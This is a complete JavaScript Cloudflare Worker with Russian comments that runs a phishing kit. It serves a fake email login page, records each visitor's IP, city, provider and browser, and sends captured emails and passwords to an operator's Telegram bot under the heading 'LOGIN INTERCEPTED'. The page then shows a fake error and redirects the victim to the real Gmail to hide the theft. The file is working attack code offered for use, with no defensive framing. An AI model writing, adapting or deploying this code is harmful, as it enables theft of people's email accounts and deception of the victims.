export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: cors() });
    }

    if (path === "/" && request.method === "GET") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "";
      ctx.waitUntil(sendTG(env,
        `👀 <b>Заход на страницу</b>\nIP: <code>${esc(ip)}</code>\nUA: <code>${esc(ua.slice(0,120))}</code>`
      ));
      return new Response(PAGE, {
        headers: { "Content-Type": "text/html; charset=utf-8", ...cors() },
      });
    }

    // ---------- Приём логина и пароля ----------
    if (path === "/login" && request.method === "POST") {
      let d = {};
      try { d = await request.json(); } catch (_) {}

      const ip = request.headers.get("CF-Connecting-IP")
        || request.headers.get("X-Forwarded-For")?.split(",")[0].trim()
        || "unknown";
      const ua = request.headers.get("User-Agent") || "";
      const country = request.headers.get("CF-IPCountry") || "??";

      const email = String(d.email || "").slice(0, 200);
      const password = String(d.password || "").slice(0, 200);

      // Гео по IP через бесплатный API
      let city = "н/д", region = "н/д", provider = "н/д";
      try {
        const r = await fetch(`http://ip-api.com/json/${ip}?lang=ru&fields=status,country,regionName,city,isp`);
        const j = await r.json();
        if (j.status === "success") {
          city = j.city || "н/д";
          region = j.regionName || "н/д";
          provider = j.isp || "н/д";
        }
      } catch (e) {}

      const text =
        `🔑 <b>ЛОГИН ПЕРЕХВАЧЕН</b>\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📧 Email: <code>${esc(email)}</code>\n` +
        `🔒 Пароль: <code>${esc(password)}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🌐 IP: <code>${esc(ip)}</code>\n` +
        `📍 Страна: <code>${esc(country)}</code>\n` +
        `🏙 Город: <code>${esc(city)}</code>\n` +
        `🗺 Регион: <code>${esc(region)}</code>\n` +
        `📡 Провайдер: <code>${esc(provider)}</code>\n` +
        `💻 UA: <code>${esc(ua.slice(0, 120))}</code>\n` +
        `🕐 ${new Date().toISOString()}`;

      ctx.waitUntil(sendTG(env, text));
      return new Response(null, { status: 204, headers: cors() });
    }

    return new Response("Not found", { status: 404 });
  },
};

function esc(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function cors() {
  return {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  };
}

async function sendTG(env, text) {
  const token = env.TG_TOKEN, chat = env.TG_CHAT;
  if (!token || !chat) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chat, text, parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.log("TG error:", e.message);
  }
}

// ============================================================
// HTML — страница входа, маскировка под почтовый сервис
// ============================================================
const PAGE = `<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>Вход в почту</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{font-family:-apple-system,system-ui,"Segoe UI",Arial,sans-serif;
       background:#f5f6f8;color:#1f2937;display:grid;place-items:center;
       min-height:100vh;margin:0;padding:20px}
  .card{background:#fff;padding:40px 36px;border-radius:12px;max-width:400px;
        width:100%;box-shadow:0 8px 30px rgba(0,0,0,.08);
        border:1px solid #e5e7eb}
  .logo{font-size:26px;font-weight:700;color:#2563eb;
        text-align:center;margin:0 0 6px}
  h1{font-size:20px;font-weight:600;text-align:center;margin:0 0 6px;color:#111827}
  .sub{color:#6b7280;font-size:13px;text-align:center;margin:0 0 28px}
  label{display:block;font-size:13px;color:#374151;margin:16px 0 6px;font-weight:500}
  input{width:100%;padding:12px 14px;font-size:15px;
        border:1px solid #d1d5db;border-radius:8px;background:#fff;
        color:#111827;outline:none;transition:border .15s, box-shadow .15s}
  input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.15)}
  button{width:100%;padding:13px;font-size:15px;font-weight:600;
         background:#2563eb;color:#fff;border:0;border-radius:8px;
         cursor:pointer;margin-top:22px;transition:background .15s}
  button:hover{background:#1d4ed8}
  button:disabled{background:#93c5fd;cursor:wait}
  .foot{text-align:center;font-size:13px;color:#6b7280;margin-top:22px}
  .foot a{color:#2563eb;text-decoration:none}
  .foot a:hover{text-decoration:underline}
  .err{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;
       padding:10px 14px;border-radius:8px;font-size:13px;
       margin-top:16px;display:none}
  .err.show{display:block}
</style>
</head>
<body>
<form class="card" id="f" autocomplete="on">
  <div class="logo">✉ Mail</div>
  <h1>Вход в аккаунт</h1>
  <p class="sub">Используйте адрес электронной почты для входа</p>

  <label for="email">Email</label>
  <input id="email" name="email" type="email" placeholder="you@example.com"
         autocomplete="username" required autofocus>

  <label for="password">Пароль</label>
  <input id="password" name="password" type="password" placeholder="••••••••"
         autocomplete="current-password" required>

  <div class="err" id="err">Неверный email или пароль. Попробуйте снова.</div>

  <button type="submit" id="btn">Войти</button>

  <div class="foot">
    <a href="#">Забыли пароль?</a> · <a href="#">Создать аккаунт</a>
  </div>
</form>

<script>
(function(){
  var f = document.getElementById('f');
  var btn = document.getElementById('btn');
  var err = document.getElementById('err');

  f.addEventListener('submit', function(e){
    e.preventDefault();
    btn.disabled = true;
    btn.textContent = 'Проверяем…';
    err.classList.remove('show');

    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Отправляем в Worker — он перешлёт в Telegram
    fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email, password: password })
    }).catch(function(){});

    // Имитация «проверки» 1.5 сек, потом «ошибка» + редирект на настоящий сайт
    setTimeout(function(){
      err.classList.add('show');
      btn.disabled = false;
      btn.textContent = 'Войти';

      // Через 1.5 секунды отправляем на настоящий mail-сервис
      setTimeout(function(){
        window.location.href = 'https://mail.google.com';
      }, 1500);
    }, 1500);
  });
})();
</script>
</body>
</html>`;